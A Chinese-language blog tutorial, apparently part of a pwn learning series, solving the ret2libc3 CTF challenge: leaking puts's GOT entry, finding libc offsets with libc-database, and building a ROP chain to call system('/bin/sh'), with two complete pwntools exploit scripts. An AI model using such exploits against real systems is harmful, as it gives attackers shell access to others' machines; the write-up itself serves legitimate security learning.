<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无/bin/sh） | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="示例：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2libc&#x2F;ret2libc3参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41918771&#x2F;article&#x2F;details&#x2F;90665950 &gt; https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;stackove">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无&#x2F;bin&#x2F;sh）">
<meta property="og:url" content="http://example.com/2020/08/07/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0!bin!sh%EF%BC%89/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="示例：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2libc&#x2F;ret2libc3参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41918771&#x2F;article&#x2F;details&#x2F;90665950 &gt; https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;stackove">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-08-07T03:43:46.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:17.962Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/08/07/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0!bin!sh%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无/bin/sh）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2021-07-04 17:57:17'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">317</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无/bin/sh）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-08-07T03:43:46.000Z" title="Created 2020-08-07 11:43:46">2020-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:17.962Z" title="Updated 2021-07-04 17:57:17">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无/bin/sh）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>示例：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3</a><br>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41918771/article/details/90665950">https://blog.csdn.net/qq_41918771/article/details/90665950</a> &gt; <a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#3">https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#3</a></p>
</blockquote>
<p>将文件下载下来，检查一下文件保护：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596772481361-94ed9d60-a346-41f6-a825-7ecde28465cb.png#align=left&display=inline&height=221&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200807115432.png&originHeight=221&originWidth=724&size=126691&status=done&style=none&width=724" alt="QQ截图20200807115432.png"><br>32 位程序，只开启了栈上不可执行保护。<br>扔到 IDA 中：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596772613000-274cd9fd-e770-46da-9322-6f7e2e2c6c84.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200807115643.png&originHeight=239&originWidth=579&size=15721&status=done&style=none&width=579" alt="QQ截图20200807115643.png"><br>计算栈偏移，可以得到为 112（略），在 IDA 里看一下，并没有发现 system 函数和/bin/sh 字符串的身影。<br>现在当务之急就是得到 system 函数的地址，那么我们如何得到呢？这里就主要利用了两个知识点：</p>
<ul>
<li>system 函数属于 libc，而 <strong>libc.so 动态链接库中的函数之间相对偏移是固定的。</strong></li>
<li>即使程序有 ASLR 保护，<strong>也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变</strong>。而 libc 在 github 上有人进行收集，如下<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a><blockquote>
<p>也可以使用工具网站：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a>，这个网址的数据库基于 libc-database</p>
</blockquote>
</li>
</ul>
<p>所以我们只要得到 libc 的版本，就可以知道了 system 函数和/bin/sh 的偏移量。知道偏移量后，再找到 libc 的基地址，就可以得到 system 函数的真实地址，就可以做我们想要做的事情了，我们可以通过一个公式来得到 system 的真实地址。</p>
<blockquote>
<p>libc 基地址  +   函数偏移量   =   函数真实地址</p>
</blockquote>
<p>应该怎么找 libc 基地址呢？真是一个让人头疼的问题。<br>我们可以泄露一个函数的真实地址，然后根据公式可以得到 libc 的基地址，因为知道了 libc 版本，就知道了函数偏移量。<br>问题又来了，我们该如何泄露函数的真实地址的，这里涉及到了 libc 的<strong>延迟绑定技术</strong>，这个技术大概就是当第一次调用一个函数的时候，这个函数的 got 表里存放着是下一条 plt 表的指令的地址，然后再经过一系列的操作(这里不详解 got 表和 plt 表的关系了，太复杂)得到了这个函数的真实地址，然后呢，再把这个函数的真实地址放到了 got 表里。当第二次调用这个函数的时候，就可以直接从 Got 表里取函数的真实地址，不用再去寻找了。<br>我们要泄露函数的真实地址<strong>，一般的方法是采用 got 表泄露，因为只要之前执行过 puts 函数，got 表里存放着就是函数的真实地址了，这里我用的是 puts 函数，因为程序里已经运行过了 puts 函数，真实地址已经存放到了 got 表内。我们得到 puts 函数的 got 地址后，可以把这个地址作为参数传递给 puts 函数，则会把这个地址里的数据，即 puts 函数的真实地址给输出出来，这样我们就得到了 puts 函数的真实地址。</strong><br><strong>脚本如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span></span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#puts的plt表的地址，我们需要利用puts函数泄露</span></span><br><span class="line">main_plt_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]<span class="comment">#返回地址被覆盖为main函数的地址。使程序还可被溢出</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_got_addr = &quot;</span>,<span class="built_in">hex</span>(puts_got_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_plt_addr = &quot;</span>,<span class="built_in">hex</span>(puts_plt_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;main_plt_addr = &quot;</span>,<span class="built_in">hex</span>(main_plt_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(puts_plt_addr)<span class="comment">#覆盖返回地址为puts函数</span></span><br><span class="line">payload += p32(main_plt_addr)<span class="comment">#这里是puts函数返回的地址。</span></span><br><span class="line">payload += p32(puts_got_addr)<span class="comment">#这里是puts函数的参数</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])将地址输出出来后再用<span class="number">332</span>解包，此时就得到了puts函数的真实地址。</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596774478252-40612ad2-abce-46fa-87ef-202faa2e0789.png#align=left&display=inline&height=255&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200807122730.png&originHeight=255&originWidth=517&size=105325&status=done&style=none&width=517" alt="QQ截图20200807122730.png"></p>
<blockquote>
<p>运行后得到函数的真实地址为 0xf7d51fd0<br>上面说过，需要知道 libc 的版本才能知道函数偏移量，我们根据函数真实地址可以得到 libc 版本。aslr 技术，是地址随机化，虽然是地址随机化，但低十二位是不变的，因为需要内存页对齐，puts 函数的真实地址 0xf7d51fd0 的低十二位是 fd0，然后在网站 libc_search 上可以根据后十二位查到这个函数所在的 libc 的版本。</p>
</blockquote>
<hr>
<blockquote>
<p><strong>由于上面提到的网站无法查到 kali 2019 二月版本的 libc 版本（我使用的是这个版本），再加上是本地 pwn，因此我们使用 kali 本地自带的 libc 库文件就行了。当然，在实际环境中，肯定需要目标靶机的 libc。</strong> &gt; <strong>网站上大部分为 ubuntu 的 libc 文件</strong></p>
</blockquote>
<p>如何查找 libc 所在文件目录？如下图所示<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596857155686-2be9e0eb-b3b9-44b6-a595-f2789b2bf35a.png#align=left&display=inline&height=93&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200808112545.png&originHeight=93&originWidth=453&size=36191&status=done&style=none&width=453" alt="QQ截图20200808112545.png"></p>
<blockquote>
<p>/usr/lib/x86_64-linux-gnu/libc.so.6 #这个 libc 应该是编译 elf 文件时候所用到的<br>/usr/lib32/libc.so.6 #这个是运行 elf 文件时加载程序所用到的</p>
</blockquote>
<p>进入到/usr/lib32/目录下，找到此文件<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596857341114-6be8ef60-20ff-462f-ac72-3af0b1b18c0e.png#align=left&display=inline&height=637&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200808112853.png&originHeight=637&originWidth=809&size=26151&status=done&style=none&width=809" alt="QQ截图20200808112853.png"><br>拖入到宿主机中，却发现<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596857397829-fd97521d-b4db-4bf8-b017-a6816b7c70db.png#align=left&display=inline&height=860&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200808112938.png&originHeight=860&originWidth=1008&size=102566&status=done&style=none&width=1008" alt="QQ截图20200808112938.png"><br>右键，将文件添加到压缩包中，然后拖出来。<br>放入 HxD 中查看此文件：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596857503836-fb007dbc-edb8-427e-b33c-0ede3e39e6c7.png#align=left&display=inline&height=735&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200808113130.png&originHeight=735&originWidth=846&size=90109&status=done&style=none&width=846" alt="QQ截图20200808113130.png"><br>原来此符号链接链接的是同目录下的 libc-2.28.so 文件<br>顺利的将 libc-2.28.so 文件拖入到宿主机中，直接扔到 IDA 里分析。<br>当然，也可以使用上面提到的工具<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">libc-database</a></p>
<blockquote>
<p>在 kali 中，执行如下命令：<br>git clone <a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database.git">https://github.com/niklasb/libc-database.git</a> &gt; <img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596857874861-17459aa0-4fcd-42ac-bd29-516fea885581.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200808113744.png&originHeight=189&originWidth=708&size=59270&status=done&style=none&width=708" alt="QQ截图20200808113744.png"></p>
</blockquote>
<hr>
<p>在 github 上可以轻松的找到教程：<br><strong>Building a libc offset database</strong><br>Fetch all the configured libc versions and extract the symbol offsets. It will not download anything twice, so you can also use it to update your database:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./get   #安装或更新你的libc数据库</span><br></pre></td></tr></table></figure>

<p>You can also add a custom libc to your database.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./add /usr/lib/libc-2.21.so   #添加本地的libc文件到数据库</span><br></pre></td></tr></table></figure>

<p>Find all the libc’s in the database that have the given names at the given addresses. Only the last 12 bits are checked, because randomization usually works on page size level.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./find printf 260 puts f30    #查找符合要求的libc数据库文件</span><br><span class="line">archive-glibc (id libc6_2.19-10ubuntu2_i386)</span><br></pre></td></tr></table></figure>

<p>Find a libc from the leaked return address into __libc_start_main.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./find __libc_start_main_ret a83</span><br><span class="line">ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.6_i386)</span><br><span class="line">archive-eglibc (id libc6_2.19-0ubuntu6_i386)</span><br><span class="line">ubuntu-utopic-i386-libc6 (id libc6_2.19-10ubuntu2.3_i386)</span><br><span class="line">archive-glibc (id libc6_2.19-10ubuntu2_i386)</span><br><span class="line">archive-glibc (id libc6_2.19-15ubuntu2_i386)</span><br></pre></td></tr></table></figure>

<p>Dump some useful offsets, given a libc ID. You can also provide your own names to dump.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./dump libc6_2.19-0ubuntu6.6_i386     #dumplibc文件的部分数据偏移信息</span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br></pre></td></tr></table></figure>

<p>Check whether a library is already in the database.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./identify /usr/lib/libc.so.6</span><br><span class="line">id local-f706181f06104ef6c7008c066290ea47aa4a82c5</span><br></pre></td></tr></table></figure>

<p>Download the whole libs corresponding to a libc ID.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./download libc6_2.23-0ubuntu10_amd64</span><br><span class="line">Getting libc6_2.23-0ubuntu10_amd64</span><br><span class="line">    -&gt; Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb</span><br><span class="line">    -&gt; Downloading package</span><br><span class="line">    -&gt; Extracting package</span><br><span class="line">    -&gt; Package saved to libs/libc6_2.23-0ubuntu10_amd64</span><br><span class="line">$ ls libs/libc6_2.23-0ubuntu10_amd64</span><br><span class="line">ld-2.23.so ... libc.so.6 ... libpthread.so.0 ...</span><br></pre></td></tr></table></figure>

<hr>
<p>首先添加本地的 libc 文件：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596859076768-336f9eda-ae2b-424e-8b8d-5d938d7af69d.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200808115751.png&originHeight=147&originWidth=727&size=49307&status=done&style=none&width=727" alt="QQ截图20200808115751.png"><br>查看 libc 文件的部分信息：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596860749324-b1a326ac-5da2-48eb-bce2-1f334eb35996.png#align=left&display=inline&height=167&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200808122539.png&originHeight=167&originWidth=723&size=91034&status=done&style=none&width=723" alt="QQ截图20200808122539.png"><br>至此我们得到了 system 函数的偏移量和/bin/sh 的偏移量(即 str_bin_sh)。(当然，在 IDA 里也可以查看)<br>最后理一下思路 1.泄露 puts 函数的真实地址 2.得到 libc 的版本 3.得到 system 和 puts 和 sh 的偏移，计算 libc 基地址 4.计算 system 和 sh 的真实地址 5.构造 payload 为 system(’/bin/sh’) 6.写 exp<br>在上一个脚本的基础上加几行代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_plt_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_got_addr = &quot;</span>,<span class="built_in">hex</span>(puts_got_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_plt_addr = &quot;</span>,<span class="built_in">hex</span>(puts_plt_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;main_plt_addr = &quot;</span>,<span class="built_in">hex</span>(main_plt_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(puts_plt_addr)</span><br><span class="line">payload += p32(main_plt_addr)</span><br><span class="line">payload += p32(puts_got_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys_offset = <span class="number">0x0003e980</span></span><br><span class="line">puts_offset = <span class="number">0x00068FD0</span></span><br><span class="line">sh_offset = <span class="number">0x00017eaaa</span></span><br><span class="line"></span><br><span class="line">libc_base_addr = puts_addr - puts_offset</span><br><span class="line">sys_addr = libc_base_addr + sys_offset</span><br><span class="line">sh_addr = libc_base_addr + sh_offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(libc_base_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(sh_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1596861272161-aebfca6f-05c8-487d-a31f-b4763fbfb557.png#align=left&display=inline&height=416&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200808123424.png&originHeight=416&originWidth=543&size=56540&status=done&style=none&width=543" alt="QQ截图20200808123424.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2020/08/07/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0!bin!sh%EF%BC%89/">http://example.com/2020/08/07/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0!bin!sh%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/10/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-7%EF%BC%89-%E4%B8%AD%E7%BA%A7ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div 